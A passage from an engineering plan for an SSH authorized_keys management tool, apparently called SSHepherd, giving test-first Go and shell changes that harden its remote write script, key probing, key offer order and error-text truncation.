	return `if [ -L "$p" ]; then exit 45; fi; if [ ! -f "$p" ]; then exit 46; fi` +
		`; rm -f "$c" || exit 1; (set -C; cat "$p" > "$c") || exit 1` +
		`; set -- $(cksum < "$c"); if [ "$1" != ` + strconv.FormatUint(uint64(expect.Cksum), 10) +
		` ] || [ "$2" != ` + strconv.Itoa(expect.Size) + ` ]; then rm -f "$c"; exit 46; fi` +
		`; if [ ! -e "$o" ] && [ ! -L "$o" ] && [ "$(head -n 1 "$c")" != ` + sshconn.ShQuote(authkeys.ManagedHeader) +
		` ]; then (set -C; cat "$c" > "$o") || exit 1; fi` +
		`; rm -f "$b" || exit 1; mv -f "$c" "$b" || exit 1`
}
```

Rewrite the doc comment's steps 4–7 in the new order: lock → upload + length check + per-file flush → snapshot/CAS/.orig/.bak (flushed) → mv. State that the directory entry is not flushed (best effort; a crash may lose the rename and leave the old complete file).

- [ ] **Step 4: Run them and watch them pass.** `go test ./internal/sshwrite/ -run 'TestWriteCmd|TestRestoreCmd|TestScripts' -v`. The existing "compare-and-swap mismatch refuses", "backs up", "planted backup symlinks" and "short stdin" subtests must still pass unchanged, because they assert outcomes, not order. `TestScriptsAreSingleLineAndQuotePathOnce` must stay green: the path still enters exactly once.

#### Task 3 (11A): WP-4, per-file flushes in the right places (never a global `sync`)

> **Revised by the review panel.** The earlier draft used `sync "$t" 2>/dev/null || sync`. On coreutils before 8.24 (RHEL/CentOS 7's 8.22) `sync FILE` ignores its arguments and runs a **global** sync, which blocks uninterruptibly on a hung NFS mount while the script holds `$p.sshepherd.lock`; the 2-minute session budget only closes the client socket, so the result is a stale lock (WP-7). The flush is now per-file with no global fallback: `dd if=/dev/null of=FILE conv=notrunc,fsync 2>/dev/null || :` (GNU coreutils dd since 6.0 and busybox dd both support `conv=fsync`). Directories cannot be opened for writing by `dd`, so the directory entry is **not** flushed; that is best effort and documented: after a crash the rename may be lost, which leaves the *old* complete file (never an empty one), and the temp's own data is on disk before the `mv`. The earlier test also SKIPped when no log existed, which is exactly today's state, so it could never fail (testing panel). The skip now keys on a separate marker.

**Files:** `internal/sshwrite/sshwrite.go` (the flush lines placed in Task 2's script), `internal/sshwrite/sshwrite_test.go`

Task 2's script body (above) carries these flush lines; this task adds the test that proves them (write the test first, against Task 2's script with the two `dd` lines left out, and watch it fail):

```go
		`; dd if=/dev/null of="$t" conv=notrunc,fsync 2>/dev/null || :` + // WP-4: the temp's data is on disk before the rename
		`; ` + casBackupBlock(expect) +
		`; if [ -e "$b" ]; then dd if=/dev/null of="$b" conv=notrunc,fsync 2>/dev/null || :; fi` +
		`; mv -f "$t" "$p" || { rm -f "$t"; exit 1; }`
```

- [ ] **Step 1: Write the test.** It records each `dd` call and what the target held at that moment, records each `sync` call (there must be none), and proves the stubs ran through a `wc` marker (the script always runs `wc -c` through PATH).

```go
func TestWriteCmdFlushesPerFileNeverGlobalSync(t *testing.T) {
	forEachShell(t, func(t *testing.T, sh []string) {
		home := t.TempDir()
		target := filepath.Join(home, "auth")
		writeFile(t, target, "old\n")
		stub := t.TempDir()
		ddLog, syncLog, wcMark := filepath.Join(stub, "dd.log"), filepath.Join(stub, "sync.log"), filepath.Join(stub, "wc.called")
		ddBin, err := exec.LookPath("dd")
		if err != nil {
			t.Fatal(err)
		}
		wcBin, err := exec.LookPath("wc")
		if err != nil {
			t.Fatal(err)
		}
		writeFile(t, filepath.Join(stub, "dd"), "#!/bin/sh\nprintf '%s|%s\\n' \"$*\" \"$(head -n 1 '"+target+"')\" >> '"+ddLog+"'\nexec "+ddBin+" \"$@\"\n")
		writeFile(t, filepath.Join(stub, "sync"), "#!/bin/sh\necho \"$*\" >> '"+syncLog+"'\n")
		writeFile(t, filepath.Join(stub, "wc"), "#!/bin/sh\n: > '"+wcMark+"'\nexec "+wcBin+" \"$@\"\n")
		for _, n := range []string{"dd", "sync", "wc"} {
			if err := os.Chmod(filepath.Join(stub, n), 0o700); err != nil { // #nosec G302 -- test stub
				t.Fatal(err)
			}
		}
		code := runShEnv(t, sh, writeCmdFor(target, SnapshotOf(false, []byte("old\n")), len(managed)), home, []byte(managed), "PATH="+stub+":"+os.Getenv("PATH"))
		if code != 0 {
			t.Fatalf("exit = %d", code)
		}
		if _, err := os.Stat(wcMark); os.IsNotExist(err) {
			t.Skipf("%v runs coreutils as built-in applets; a PATH stub cannot observe them", sh)
		}
		if raw, err := os.ReadFile(syncLog); err == nil {
			t.Errorf("the script ran sync (%q); a global sync can hang on NFS while holding the lock", raw)
		}
		raw, _ := os.ReadFile(ddLog)
		lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
		if len(lines) != 2 || lines[0] == "" {
			t.Fatalf("dd calls = %q, want 2 (temp before mv, .bak before mv)", lines)
		}
		if want := "if=/dev/null of=" + target + tmpSuffix + " conv=notrunc,fsync|old"; lines[0] != want {
			t.Errorf("first flush = %q, want %q (temp flushed while the old file is still live)", lines[0], want)
		}
		if want := "if=/dev/null of=" + target + bakSuffix + " conv=notrunc,fsync|old"; lines[1] != want {
			t.Errorf("second flush = %q, want %q (.bak flushed before the rename)", lines[1], want)
		}
	})
}
```

- [ ] **Step 2: Run it and watch it fail.** Before the flush lines exist it FAILS on dash and bash with `dd calls = [""]` (the `wc` marker exists, so it does not skip). `rtk proxy go test ./internal/sshwrite/ -run TestWriteCmdFlushes -v`. busybox-static skips it (applets ignore PATH), the same way the existing PATH-stubbed mkdir test does (sshwrite_test.go:502-506).
- [ ] **Step 3: Implement:** add the two `dd` lines. **Step 4:** the test PASSES on every non-applet shell, and `TestWriteCmdThroughRealSh` stays green.

#### Task 4 (11B): WP-10, the keys2 probe on equivalent spellings of the default path

**Files:** `internal/sshconn/sshconn.go` (`SecondaryKeysCmd` :80-85), `internal/sshconn/sshconn_test.go` (next to `TestSecondaryKeysCmd` :402), `internal/sshread/sshread.go` (:154-196), `internal/sshread/hermetic_test.go` (:50-95), `internal/sshread/integration_test.go`

- [ ] **Step 1: Write the failing tests.** In `sshconn_test.go`, run the script through a real sh, the same way as `TestSecondaryKeysCmd`:

```go
func TestSecondaryKeysCmdFor(t *testing.T) {
	tests := []struct {
		name  string
		path  func(home string) string
		setup func(t *testing.T, home string)
		ak2   bool
		want  bool
	}{
		{"default spelling", func(string) string { return DefaultAuthorizedKeysPath }, nil, true, true},
		{"absolute default", func(h string) string { return filepath.Join(h, ".ssh", "authorized_keys") }, nil, true, true},
		{"through a symlinked dir", func(h string) string { return filepath.Join(h, "link", "authorized_keys") },
			func(t *testing.T, h string) { must(t, os.Symlink(filepath.Join(h, ".ssh"), filepath.Join(h, "link"))) }, true, true},
		{"absolute default, no keys2", func(h string) string { return filepath.Join(h, ".ssh", "authorized_keys") }, nil, false, false},
		{"other file in ~/.ssh", func(h string) string { return filepath.Join(h, ".ssh", "other") }, nil, true, false},
		{"tilde override elsewhere", func(string) string { return "~/keys/deploy" }, nil, true, false},
		{"missing dir never matches", func(h string) string { return filepath.Join(h, "nodir", "authorized_keys") }, nil, true, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			home := t.TempDir() // on macOS /var → /private/var: cd -P must resolve both sides
			must(t, os.MkdirAll(filepath.Join(home, ".ssh"), 0o700))
			if tt.ak2 {
				must(t, os.WriteFile(filepath.Join(home, ".ssh", "authorized_keys2"), []byte("ssh-ed25519 AAAA planted\n"), 0o600))
			}
			if tt.setup != nil {
				tt.setup(t, home)
			}
			c := exec.CommandContext(t.Context(), "sh", "-c", SecondaryKeysCmdFor(tt.path(home)))
			c.Env = []string{"HOME=" + home, "PATH=" + os.Getenv("PATH")}
			code := 0
			var exitErr *exec.ExitError
			if err := c.Run(); errors.As(err, &exitErr) {
				code = exitErr.ExitCode()
			} else if err != nil {
				t.Fatal(err)
			}
			if present, err := FinishSecondaryProbe(code, NewCappedBuffer(10)); err != nil || present != tt.want {
				t.Errorf("probe = (%v, %v), want (%v, nil)", present, err, tt.want)
			}
		})
	}
}
```

(`must` is a one-line `t.Fatal` helper. Add it if the file has none.)

In `hermetic_test.go`, `TestReadReportsAuthorizedKeys2` gets more cases, with `$HOME` replaced by the per-subtest home: `override := strings.ReplaceAll(tt.override, "$HOME", home)`.

```go
		{"absolute default path is probed", "ssh-ed25519 AAAA planted\n", "$HOME/.ssh/authorized_keys", true},
		{"absolute non-default path is not flagged", "ssh-ed25519 AAAA planted\n", "$HOME/keys/deploy", false},
```

In `integration_test.go`, add a case on the read-only fixture user `absent`. It already has a non-empty `authorized_keys2` and no default file (scripts/integration.sh:49), so no fixture change is needed.

```go
func TestIntegrationKeys2OnAbsoluteDefaultPath(t *testing.T) {
	c, host, port := itClient(t)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	res, err := c.ReadAuthorizedKeys(ctx, config.Server{
		Name: "it", Host: host, Port: port, User: "absent", AuthorizedKeysFile: "/home/absent/.ssh/authorized_keys",
	})
	if err != nil {
		t.Fatalf("ReadAuthorizedKeys: %v", err)
	}
	if !res.FileAbsent || !res.AuthorizedKeys2 {
		t.Errorf("FileAbsent=%v AuthorizedKeys2=%v, want both true (the absolute spelling of the default file)", res.FileAbsent, res.AuthorizedKeys2)
	}
}
```

- [ ] **Step 2: Run them and watch them fail.** Run `go test ./internal/sshconn/ -run TestSecondaryKeysCmdFor` (it does not compile: undefined `SecondaryKeysCmdFor`), then `go test ./internal/sshread/ -run TestReadReportsAuthorizedKeys2 -v` (`absolute default path is probed: AuthorizedKeys2 = false, want true`).

- [ ] **Step 3: Implement.** In `sshconn.go`:

```go
// SecondaryKeysCmdFor builds the authorized_keys2 probe for a server whose
// managed file is path: exit 46 when path is — on the server, resolving
// symlinks with cd -P — the login user's ~/.ssh/authorized_keys (sshd's
// compiled-in first AuthorizedKeysFile entry, which keeps .ssh/authorized_keys2
// beside it) and ~/.ssh/authorized_keys2 is non-empty; 0 otherwise. A
// directory that does not resolve never matches, so two missing
// directories cannot both collapse to "/authorized_keys".
func SecondaryKeysCmdFor(path string) string {
	if path == DefaultAuthorizedKeysPath {
		return SecondaryKeysCmd()
	}
	return PathAssign(path) + `; h="${HOME:?}"` +
		`; a=$(cd -P "$(dirname "$p")" 2>/dev/null && pwd -P) || exit 0` +
		`; s=$(cd -P "$h/.ssh" 2>/dev/null && pwd -P) || exit 0` +
		`; if [ "$a/${p##*/}" != "$s/authorized_keys" ]; then exit 0; fi` +
		`; if [ -s "$h/.ssh/authorized_keys2" ]; then exit 46; fi`
}
```

Update the `SecondaryKeysCmd` doc to say "the default spelling; see SecondaryKeysCmdFor". In `sshread.go`, replace `if path == sshconn.DefaultAuthorizedKeysPath {` (:185) with an unconditional block that runs `sshconn.SecondaryKeysCmdFor(path)`, and update the function doc (:154-160) to say "default path or an equivalent spelling". This costs one extra short session per non-default read. Note it in the doc.

- [ ] **Step 4: Run them and watch them pass.** Run `go test ./internal/sshconn/ ./internal/sshread/ -v -run 'Secondary|Keys2'`, then `make integration` (the integrator runs this). Apply needs no change: `DisableKeys2` acts on `~/.ssh/authorized_keys2`, which is the right file whenever the probe matched. 11C updates the `plan.go:114-117` comment ("only probed while the managed path is the default" → "probed when the managed path is the default file under any spelling that resolves to it").

#### Task 5 (11C): WP-5, probe order = production order (one probe per server)

> **Revised by the review panel (security-writepath BLOCKER).** The earlier draft added a second, key-files-only probe (`Request.FileSurvivors`). It is **removed**: it rolled back writes the first probe had proven safe (a restricted `--identity` line such as `from="10.0.0.0/8"` failed from a laptop), and it added a 4th connection per server on rate-limited hosts, where any failure still restores (P08-impl lands later), so a `revoke` could reinstall the revoked key more often than today. Proving the headless key on its own is now owner question **D9b** in P08 (warn-only). P11 hands back **no** `sshwrite.go` hunk for this task; `Request` is unchanged.
>
> **Behavior change, named (owner decision D31, asked before W2):** the probe no longer prefers `--identity` key files over agent keys. It proves exactly the key the next run logs in with. README:1255 ("the post-write probe (which offers surviving key files first)") and README:1440 change accordingly. If D31 is unanswered at W2 start, the 11C lane skips this task and WP-5 waits for the answer.

**Files:** `internal/audit/audit.go` (`GrantedFingerprints` :121-132), `internal/audit/audit_test.go`, `internal/apply/exec.go` (`applyOne` :101-108, `probeOrder` :126-156), `internal/apply/exec_test.go`, `internal/apply/identity_test.go` (`TestProbeOrder` :152), `internal/apply/offer_rank_test.go` (new), `cmd/sshepherd/probe_order_hermetic_test.go` (new; 11C owns it, no other W2 lane touches this new file)

**Design.** Production offers `PreferKeys = audit.GrantedFingerprints(cfg, server)` first (`orderSigners`, connect.go:240-265; `cmd/sshepherd/apply.go:92`, `audit.go:93`, `adopt.go:150`). So the order production uses on its first accepted key, restricted to held keys, is exactly `GrantedFingerprints` filtered to the held keys.

- One function, `audit.OfferOrder`, defines that order and **demotes** risky lines. Every later read and write therefore authenticates with an unrestricted key when one is held, and the WP-5 takeover cannot happen in the first place.
- The probe offers `OfferOrder(p.Desired)` filtered to the survivors: **one** probe per server, as today. `p.Desired` is the edited config's `DesiredFor` list (plan.go:165-168), which is the list the next run's `GrantedFingerprints` uses.
- `offerRank` is built **only** from P05's option table (`authkeys.CertOnly`, `authkeys.FindOption(opts, "command")`, `authkeys.BlocksLogin`); it never re-matches prefixes. `hasRestrictiveOption` already calls `authkeys.BlocksLogin` (P05 Task 3), so the probe order and the guard's "all survivors restrictive" warning read the same table.

- [ ] **Step 1: Write the failing tests.** In `audit_test.go` (add the helper next to the test):

```go
func fpOf(t *testing.T, seed byte) string {
	t.Helper()
	k, err := authkeys.ParseLine(testkeys.Line(t, seed))
	if err != nil {
		t.Fatal(err)
	}
	return k.Fingerprint
}

func TestGrantedFingerprintsDemotesRiskyLines(t *testing.T) {
	y := `
users:
  - {name: op, operator: true, keys: ["from=\"10.0.0.0/8\" ` + testkeys.Line(t, 1) + `"]}
  - {name: backup, keys: ["command=\"rrsync -ro /\" ` + testkeys.Line(t, 2) + `"]}
  - {name: ca, keys: ["cert-authority ` + testkeys.Line(t, 4) + `"]}
  - {name: admin, keys: ["` + testkeys.Line(t, 3) + `"]}
servers:
  - {name: s, host: 10.0.0.1, user: deploy}
access:
  - {user: backup, servers: [s]}
  - {user: ca, servers: [s]}
  - {user: admin, servers: [s]}
`
	cfg, err := config.Parse([]byte(y))
	if err != nil {
		t.Fatal(err)
	}
	// DesiredFor: op, backup, ca, admin. Offer: plain, then from=/expiry/restrict,
	// then command=, then cert-only — stable within each group.
	want := []string{fpOf(t, 3), fpOf(t, 1), fpOf(t, 2), fpOf(t, 4)}
	if got := GrantedFingerprints(cfg, "s"); !slices.Equal(got, want) {
		t.Errorf("GrantedFingerprints = %v, want %v", got, want)
	}
}
```

In `exec_test.go`, assert equality with production directly (`fp`, `agentHeld` and `buildPlansHeld` are the existing helpers in `plan_test.go:39-76`):

```go
// TestProbeOfferEqualsProductionOffer (WP-5): the probe offers survivors in
// exactly the order every later connection will (GrantedFingerprints
// filtered to held keys), so a key that gains command= and is listed first
// can never pass the probe and then capture the next session.
func TestProbeOfferEqualsProductionOffer(t *testing.T) {
	y := `
users:
  - {name: backup, keys: ["command=\"rrsync -ro /\" ` + testkeys.Line(t, 1) + `"]}
  - {name: admin, keys: ["` + testkeys.Line(t, 2) + `"]}
servers:
  - {name: s, host: 10.0.0.1, user: deploy}
access:
  - {user: backup, servers: [s]}
  - {user: admin, servers: [s]}
`
	cfg, err := config.Parse([]byte(y))
	if err != nil {
		t.Fatal(err)
	}
	held := agentHeld(fp(t, 1), fp(t, 2))
	plans := buildPlansHeld(t, cfg, &fakeReader{byName: map[string]audit.ReadResult{"s": {FileAbsent: true}}}, held)
	w := &fakeWriter{}
	Execute(context.Background(), plans, w, ExecOptions{Parallel: 1, Held: held})
	isHeld := map[string]bool{}
	for _, h := range held {
		isHeld[h.Fingerprint] = true
	}
	var want []string
	for _, f := range audit.GrantedFingerprints(cfg, "s") {
		if isHeld[f] {
			want = append(want, f)
		}
	}
	if got := w.calls["s"].Survivors; !slices.Equal(got, want) || got[0] != fp(t, 2) {
		t.Errorf("probe offers %v, production offers %v; want equal, admin's plain key first", got, want)
	}
}
```

In the new `internal/apply/offer_rank_test.go`, pin that the guard and the offer order agree on every option in P05's table:

```go
// TestOfferRankAgreesWithGuard: every option P05's table classifies is read
// the same way by the offer order and by the lockout guard's warning.
func TestOfferRankAgreesWithGuard(t *testing.T) {
	for _, tt := range []struct {
		opts       []string
		rank       int
		restrictive bool
	}{
		{nil, 0, false},
		{[]string{"no-pty"}, 0, false},
		{[]string{`from="10.0.0.0/8"`}, 1, true},
		{[]string{`expiry-time="20990101"`}, 1, true},
		{[]string{"restrict"}, 1, true},
		{[]string{`command="/bin/true"`}, 2, true},
		{[]string{"restrict", `command="/bin/true"`}, 2, true},
		{[]string{"cert-authority"}, 3, false},
		{[]string{`principals="a"`}, 3, false},
	} {
		if got := audit.OfferRank(tt.opts); got != tt.rank {
			t.Errorf("OfferRank(%q) = %d, want %d", tt.opts, got, tt.rank)
		}
		if got := hasRestrictiveOption(tt.opts); got != tt.restrictive {
			t.Errorf("hasRestrictiveOption(%q) = %v, want %v", tt.opts, got, tt.restrictive)
		}
		if tt.rank == 2 && !tt.restrictive {
			t.Errorf("%q: a forced command must count as restrictive for the guard", tt.opts)
		}
	}
}
```

Rewrite `identity_test.go` `TestProbeOrder` against the new signature `probeOrderFor(desired, surviving []authkeys.Key) []string`. The rules: the order is `audit.OfferOrder(desired)` filtered to `surviving`, and it is the same whatever the order of `surviving`. Keep `TestExecuteProbesUnrestrictedSurvivorsFirst` (exec_test.go:206) unchanged. It still holds, because `command=` is demoted.

In the new `cmd/sshepherd/probe_order_hermetic_test.go` (testing panel: prove WP-5 end to end, not only with fakes):

```go
package main

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"

	"github.com/javadh75/SSHepherd/internal/sshconn/sshtest"
)

// TestApplyThenAuditUsesPlainKeyFirst (WP-5): the manifest lists a
// forced-command key first. After apply writes it, the next audit must log
// in with the plain key and read the real file. Before the fix, audit
// offers the forced-command key first, sshd runs `echo forced`, and audit
// fails to parse the file.
func TestApplyThenAuditUsesPlainKeyFirst(t *testing.T) {
	home := shortHome(t)
	k1, k2 := sshtest.Key(1), sshtest.Key(2)
	line := func(k any) string {
		return strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sshtest.Signer(t, k).PublicKey())))
	}
	akf := filepath.Join(home, ".ssh", "authorized_keys")
	if err := os.MkdirAll(filepath.Dir(akf), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(akf, []byte(line(k2)+"\n"), 0o600); err != nil { // only the plain key today
		t.Fatal(err)
	}
	host := sshtest.Signer(t, sshtest.Key(40))
	srv := sshtest.NewServer(t, sshtest.ServerConfig{
		HostKeys: []ssh.Signer{host}, AuthorizedKeysFile: akf, Handle: sshtest.ShellHandler(home),
	})
	t.Setenv("SSH_AUTH_SOCK", sshtest.Agent(t, k1, k2))
	cfg := writeConfig(t, fmt.Sprintf(`
users:
  - {name: backup, keys: ["command=\"echo forced\" %s"]}
  - {name: admin, keys: ["%s"]}
servers:
  - {name: web-1, host: 127.0.0.1, port: %d, user: deploy}
access:
  - {user: backup, servers: [web-1]}
  - {user: admin, servers: [web-1]}
`, line(k1), line(k2), srv.Port))
	kh := sshtest.KnownHostsFile(t, srv.KnownHostsLine(host.PublicKey()))
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--yes", "--config", cfg, "--known-hosts", kh}, &out, &errBuf); code != 0 {
		t.Fatalf("apply exit = %d\nstdout: %s\nstderr: %s", code, out.String(), errBuf.String())
	}
	out.Reset()
	errBuf.Reset()
	if code := run([]string{"audit", "--config", cfg, "--known-hosts", kh}, &out, &errBuf); code != 0 {
		t.Fatalf("audit after apply exit = %d, want 0 (a forced-command key captured the session)\nstdout: %s\nstderr: %s",
			code, out.String(), errBuf.String())
	}
}
```

- [ ] **Step 2: Run them and watch them fail.** `go test ./internal/audit/ -run TestGrantedFingerprintsDemotes` gives `got [1 2 4 3]`-style order. `go test ./internal/apply/ -run 'TestProbe|TestOfferRank'` gives an order mismatch and `undefined: audit.OfferRank`. `rtk proxy go test ./cmd/sshepherd/ -run TestApplyThenAuditUsesPlainKeyFirst -v` fails on the audit step (parse error from `forced`).

- [ ] **Step 3: Implement.** In `audit.go`:

```go
// OfferRank groups a granted key line for the connection layers, read from
// authkeys' option table only: 0 lets any command run; 1 may reject the
// login or narrow the session (from=, expiry-time=, restrict); 2 forces a
// command (authenticating with it runs that command instead of sshepherd's
// script); 3 never accepts the bare key (cert-authority, principals=).
func OfferRank(options []string) int {
	switch {
	case authkeys.CertOnly(options):
		return 3
	case func() bool { _, ok := authkeys.FindOption(options, "command"); return ok }():
		return 2
	case authkeys.BlocksLogin(options):
		return 1
	}
	return 0
}

// OfferOrder is the one order in which every connection offers a server's
// granted keys — audit and adopt reads, apply's read and write, and the
// post-write probe: desired (DesiredFor order: operators, then grant order)
// stably partitioned by OfferRank, so a forced-command line is never the
// first key a session authenticates with while a plain one is held.
func OfferOrder(desired []authkeys.Key) []string {
	keys := slices.Clone(desired)
	slices.SortStableFunc(keys, func(a, b authkeys.Key) int { return cmp.Compare(OfferRank(a.Options), OfferRank(b.Options)) })
	fps := make([]string, 0, len(keys))
	for _, k := range keys {
		fps = append(fps, k.Fingerprint)
	}
	return fps
}

// GrantedFingerprints … (doc: "in OfferOrder")
func GrantedFingerprints(cfg *config.Config, server string) []string {
	return OfferOrder(cfg.DesiredFor(server))
}
```

In `exec.go`, replace `probeOrder`:

```go
// probeOrderFor returns what the post-write probe offers: the survivors in
// the order every later connection offers them (audit.OfferOrder over the
// plan's desired keys — what GrantedFingerprints hands the Dialer).
func probeOrderFor(desired, surviving []authkeys.Key) []string {
	keep := make(map[string]bool, len(surviving))
	for _, k := range surviving {
		keep[k.Fingerprint] = true
	}
	var order []string
	for _, fp := range audit.OfferOrder(desired) {
		if keep[fp] {
			order = append(order, fp)
			delete(keep, fp)
		}
	}
	return order
}
```

In `applyOne`, use `sshwrite.Request{…, Survivors: probeOrderFor(p.Desired, surviving), …}`. Drop the now-unused imports if the linter flags them.

- [ ] **Step 4: Run them and watch them pass.** `go test ./internal/audit/ ./internal/apply/` and `rtk proxy go test ./cmd/sshepherd/ -run TestApplyThenAuditUsesPlainKeyFirst -v`. Also run all of `go test ./cmd/sshepherd/`. It catches any test that pinned the old `GrantedFingerprints` order, such as `TestClientSharesOneSnapshotAndPrefersGrantedKeys` and the editrun `unionFPs` tests. If one fails, report it in `foreignBreaks`; the integrator fixes it as a merge fix, not inside an agent.

#### Task 6 (11C): COR-2, no grants + non-empty keys2 is refused

**Files:** `internal/apply/plan.go` (`planOne` :170-187, `DisableKeys2` doc :114-117), `internal/apply/plan_test.go` (`TestPlanEmptyDesiredSplit` :253)

- [ ] **Step 1: Write the failing test.** Add a row to `TestPlanEmptyDesiredSplit`'s table:

```go
		{"no keys but authorized_keys2 refuses (audit calls it drift)", audit.ReadResult{FileAbsent: true, AuthorizedKeys2: true},
			ClassRefused, "authorized_keys2 holds keys but the manifest grants none — refusing to wipe; remove it by hand"},
```

Add an agreement test:

```go
// TestApplyAuditAgreeOnKeys2WithoutGrants (COR-2): apply's exit code and
// audit's verdict agree for a no-grant server whose authorized_keys2 holds
// keys — both non-zero, and apply writes nothing (no wipe mode exists).
func TestApplyAuditAgreeOnKeys2WithoutGrants(t *testing.T) {
	cfg := emptyDesiredCfg(t)
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {Content: renderedFor(t, cfg, "web-1")}, "bare": {FileAbsent: true, AuthorizedKeys2: true}}}
	results := audit.Run(context.Background(), cfg, r, audit.Options{Parallel: 1})
	plans, err := Build(cfg, results, agentHeld(fp(t, 2)))
	if err != nil {
		t.Fatal(err)
	}
	p := planFor(t, plans, "bare")
	if p.Class != ClassRefused || p.DisableKeys2() || p.Rendered != nil {
		t.Fatalf("plan = %s (disable=%v), want a refusal that writes nothing", p.Class, p.DisableKeys2())
	}
	if ExitCode(plans) != 1 || audit.ExitCode(cfg, results) != 1 {
		t.Errorf("apply exit %d, audit exit %d; want both 1", ExitCode(plans), audit.ExitCode(cfg, results))
	}
}
```

(`audit.ExitCode(cfg *config.Config, results []ServerResult) int` is the real signature at `internal/audit/report.go:21`, adee207.)

- [ ] **Step 2: Run it and watch it fail.** `go test ./internal/apply/ -run 'TestPlanEmptyDesiredSplit|TestApplyAuditAgree' -v` gives `Class = converged, want refused`.

- [ ] **Step 3: Implement** in `planOne`'s empty-desired branch:

```go
	if len(entries) == 0 {
		if len(r.Diff.Unauthorized) == 0 && len(r.ParseErrs) == 0 {
			if r.AuthorizedKeys2 {
				// sshd still accepts keys from authorized_keys2, so this is
				// not converged (audit calls it drift). Apply never wipes a
				// server — the on-hold empty-server mode — so refuse and
				// leave the file to the operator.
				p.Class = ClassRefused
				p.Refusal = "authorized_keys2 holds keys but the manifest grants none — refusing to wipe; remove it by hand"
				return p, nil
			}
			p.Class = ClassConverged
			return p, nil
		}
		…unchanged…
```

Update the `ClassConverged` doc (:24-25) to say "…and nothing is installed (authorized_keys2 included)". The report's existing hand-removal warning (`renderKeys2Warning`, report.go:176, owned by P07) still prints under the `REFUSED:` line. That is intended and needs no change in `report.go`.

- [ ] **Step 4: Run it and watch it pass.** `go test ./internal/apply/`. `TestRenderKeys2WarningOnRefused` and the JSON goldens stay unchanged, because no golden has a no-grant keys2 server (checked: `json_security.golden.json` has keys2 only on a `change` server).

#### Task 7 (11B + 11A): SEC-8, bounded remote text in error lines

**Files:** `internal/sanitize/sanitize.go`, `internal/sanitize/truncate_test.go` (new; `sanitize_test.go` belongs to P13 and is not touched; no second `TestMain`, since `leak_test.go` already has one), `internal/sshconn/sshconn.go` (:97-98, :111), `internal/sshconn/sshconn_test.go`, and on the 11A side `internal/sshwrite/sshwrite.go` (`stageFailure` :608-611) plus `sshwrite_test.go`

- [ ] **Step 1: Write the failing tests.** `internal/sanitize/truncate_test.go`:

```go
package sanitize

import (
	"strings"
	"testing"
	"unicode/utf8"
)

func TestRemoteSnippet(t *testing.T) {
	long := strings.Repeat("a", MaxSnippet+1)
	for _, tt := range []struct{ name, in, want string }{
		{"plain", "sh: cksum: not found", "sh: cksum: not found"},
		{"whitespace collapses to one line", "line1\n\tline2   end\n", "line1 line2 end"},
		{"escapes and C1 stripped", "esc\x1b[31mred\u009b", "esc[31mred"},
		{"bidi stripped", "a‮b", "ab"},
		{"Latin letters kept", "Datei für Jürgen", "Datei für Jürgen"},
		{"blank-looking runes masked", "a⠀ㅤᅟb", "a???b"},
		{"exactly the cap", long[:MaxSnippet], long[:MaxSnippet]},
		{"one over the cap", long, long[:MaxSnippet] + truncMark},
	} {
		if got := RemoteSnippet(tt.in); got != tt.want {
			t.Errorf("%s: RemoteSnippet(%q) = %q, want %q", tt.name, tt.in, got, tt.want)
		}
	}
	t.Run("1 MiB of braille padding", func(t *testing.T) {
		got := RemoteSnippet(strings.Repeat("⠀", 1<<20/3) + "forged row")
		if n := utf8.RuneCountInString(got); n > MaxSnippet+utf8.RuneCountInString(truncMark) {
			t.Errorf("len = %d runes, want ≤ %d", n, MaxSnippet+utf8.RuneCountInString(truncMark))
		}
		if strings.ContainsRune(got, '⠀') || !strings.HasSuffix(got, truncMark) {
			t.Errorf("got %q, want masked and truncated", got[:min(len(got), 64)])
		}
	})
}

func FuzzRemoteSnippet(f *testing.F) {
	f.Add("a⠀\x1b‮\nb")
	f.Add(strings.Repeat("x", 300))
	f.Fuzz(func(t *testing.T, s string) {
		out := strings.TrimSuffix(RemoteSnippet(s), truncMark)
		if utf8.RuneCountInString(out) > MaxSnippet {
			t.Fatalf("over cap: %d runes", utf8.RuneCountInString(out))
		}
		for _, r := range out {
			if !snippetRune(r) {
				t.Fatalf("rune %U escaped the allow-list in %q", r, out)
			}
		}
	})
}
```

In `sshconn_test.go`:

```go
func TestRemoteErrorsBoundStderr(t *testing.T) {
	huge := strings.Repeat("⠀", 1<<18) + "web-3  ✓ present & authorized"
	_, err := interpretExit(1, huge)
	stderr := NewCappedBuffer(MaxRemoteOutput)
	_, _ = stderr.Write([]byte(huge))
	_, err2 := FinishSecondaryProbe(2, stderr)
	for _, e := range []error{err, err2} {
		if e == nil || len(e.Error()) > 512 || strings.ContainsRune(e.Error(), '⠀') {
			t.Errorf("err = %.80q… (%d bytes), want ≤ 512 bytes with no blank padding", e, len(e.Error()))
		}
	}
}
```

In `sshwrite_test.go` (11A): `TestStageFailureBoundsStderr`. Use `scriptedExec` with `{code: 1, stderr: strings.Repeat("⠀", 1<<18)}` as the write response, then assert `len(err.Error()) <= 512` and no U+2800.

- [ ] **Step 2: Run them and watch them fail.** `go test ./internal/sanitize/ ./internal/sshconn/ ./internal/sshwrite/ -run 'Snippet|Bound'`. The first fails to compile (undefined `RemoteSnippet`), then fails on length.

- [ ] **Step 3: Implement** in `sanitize.go`:

```go
// MaxSnippet caps, in runes, the remote text one error line may carry.
const MaxSnippet = 256

const truncMark = "…(truncated)"

// snippetRune is the allow-list for RemoteSnippet: printable ASCII, plus
// Latin letters (U+00C0–U+024F) so ordinary localized diagnostics stay
// readable. Everything else — notably blank-looking symbols such as U+2800,
// U+3164 and U+115F that are neither space, control nor format runes —
// becomes '?'.
func snippetRune(r rune) bool {
	return (r >= 0x20 && r <= 0x7e) || (r >= 0xc0 && r <= 0x24f && unicode.IsLetter(r))
}

// RemoteSnippet renders remote-controlled text (stderr) for embedding in
// one error line: control and format runes are dropped (as Remote does),
// any Unicode whitespace run becomes one space, other runes outside
// snippetRune become '?', and the result is cut at MaxSnippet runes with
// "…(truncated)" appended — so a hostile server can neither pad a line to
// forge a report row nor flood logs and JSON with a megabyte per server.
